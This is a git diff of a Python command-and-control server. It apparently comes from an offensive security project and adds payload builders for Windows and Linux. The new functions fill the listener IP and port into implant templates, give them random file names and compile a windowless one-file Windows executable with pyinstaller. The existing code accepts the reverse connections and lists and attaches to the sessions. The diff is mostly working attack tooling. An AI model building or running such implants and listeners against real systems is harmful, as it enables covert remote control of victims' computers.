@@ -1,9 +1,14 @@
 import socket
-import sys
 import threading
 import time
 from datetime import datetime
 from prettytable import PrettyTable
+import random
+import string
+import os
+import os.path
+import shutil
+import subprocess
 
 def banner(): 
     print('   __     ______     __   __     __  __     ______             ')
@@ -17,10 +22,14 @@ def helpfile():
     print ('\n')
     print ('Usage:\n')
     print ('LISTENER')
-    print ('listener -g' + ' ' * 22 + 'INPUT IP AND PORT FOR SOCKET\n')
-    print ('SESSIONS')  
-    print ('sessions -l' + ' ' * 22 + 'LIST ACTIVE SESSIONS')
-    print ('sessions -i [session number]' + ' ' * 5 + 'CONNECT TO SESSION')
+    print ('listener -n' + ' ' * 22 + 'Creates new socket based on input IP and Port\n')
+    print ('PAYLOAD GENERATION')
+    print ('winplant exe' + ' ' * 4 + 'Creates executable payload for Windows')
+    print ('winplant py' + ' ' * 5 + 'Creates Python payload for Windows')
+    print ('winplant py' + ' ' * 5 + 'Creates Python payload for Linux')
+    print ('\nSESSIONS')  
+    print ('sessions -l' + ' ' * 22 + 'Lists active sessions')
+    print ('sessions -i [session number]' + ' ' * 5 + 'Connect to session')
     print ('\n')
                                                       
 #Function to Handle Incoming Messages
@@ -88,9 +97,89 @@ def comm_handler():
         except:
             pass
 
+#Creates Python payload for Windows systems. Called with winplant py.
+def winplant():
+    randomizer = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    file_name = (f'{randomizer}.py')
+    check_cwd = os.getcwd()
+    if os.path.exists(f'{check_cwd}\\winplant.py'):
+        shutil.copy('winplant.py', file_name)
+    else:
+        print('[!] winplant.py file not found.')   
+    with open(file_name) as file:
+        new_host = file.read().replace('INPUT_IP_HERE', host_ip)
+    with open (file_name, 'w') as file:
+        file.write(new_host)
+        file.close()
+    with open(file_name) as file:
+        new_port = file.read().replace('INPUT_PORT_HERE', host_port)
+    with open (file_name, 'w') as file:
+        file.write(new_port)
+        file.close()
+    if os.path.exists(f'{file_name}'):
+        print(f'{file_name} saved to current directory.')
+    else:
+        print('[!] An unexpected error occured during the build.')
+
+#Creates Python payload for linux systems. Called with linplant py.
+def linplant():
+    randomizer = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    file_name = (f'{randomizer}.py')
+    check_cwd = os.getcwd()
+    if os.path.exists(f'{check_cwd}\\linplant.py'):
+        shutil.copy('linplant.py', file_name)
+    else:
+        print('[!] linplant.py file not found.')  
+    with open(file_name) as file:
+        new_host = file.read().replace('INPUT_IP_HERE', host_ip)
+    with open (file_name, 'w') as file:
+        file.write(new_host)
+        file.close()
+    with open(file_name) as file:
+        new_port = file.read().replace('INPUT_PORT_HERE', host_port)
+    with open (file_name, 'w') as file:
+        file.write(new_port)
+        file.close()
+    if os.path.exists(f'{file_name}'):
+        print(f'{file_name} saved to current directory.')
+    else:
+        print('[!] An unexpected error occured during the build.')
+
+#Creates an executable payload for Windows systems only. Called with winplant exe.
+def exeplant():
+    randomizer = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    file_name = (f'{randomizer}.py')
+    exe_file = (f'{randomizer}.exe')
+    check_cwd = os.getcwd()
+    if os.path.exists(f'{check_cwd}\\winplant.py'):
+        shutil.copy('winplant.py', file_name)
+    else:
+        print('[!] winplant.py file not found.')   
+    with open(file_name) as file:
+        new_host = file.read().replace('INPUT_IP_HERE', host_ip)
+    with open (file_name, 'w') as file:
+        file.write(new_host)
+        file.close()
+    with open(file_name) as file:
+        new_port = file.read().replace('INPUT_PORT_HERE', host_port)
+    with open (file_name, 'w') as file:
+        file.write(new_port)
+        file.close()
+    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
+    print(f'Compiling executable {exe_file}...')
+    subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
+    print('Cleaning up build files...')
+    os.remove(f'{randomizer}.spec')
+    shutil.rmtree('build')
+    if os.path.exists(f'{check_cwd}\\{exe_file}'):
+        print(f'Build successfully compiled. {exe_file} saved to current directory.')
+    else:
+        print('[!] An unexpected error occured during the build.')
+
 #Main
 if __name__ == '__main__':
     targets = []
+    listener_counter = 0
     banner()
     kill_flag = 0
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -99,10 +188,26 @@ if __name__ == '__main__':
             command = input('Command > ')
             if command == 'help' or command == '-h':
                 helpfile()
-            if command == 'listeners -g':
+            if command == 'listener -n':
                 host_ip = input('Enter the IP to list on: ')
                 host_port  = input('Enter the port to listen on: ')
                 listener_handler()
+                listener_counter += 1
+            if command == 'winplant py':
+                if listener_counter > 0:
+                    winplant()
+                else:
+                    print('[!] You cannot generate a payload without an active listener. Use command -h for help.')
+            if command == 'linplant py':
+                if listener_counter > 0:
+                    linplant()
+                else:
+                    print('[!] You cannot generate a payload without an active listener. Use command -h for help.')
+            if command == 'winplant exe':
+                if listener_counter > 0:
+                    exeplant()
+                else:
+                    print('[!] You cannot generate a payload without an active listener. Use command -h for help.')
             if command.split(" ")[0] == 'sessions': 
                 session_counter = 0
                 if command.split(" ")[1] == '-l':
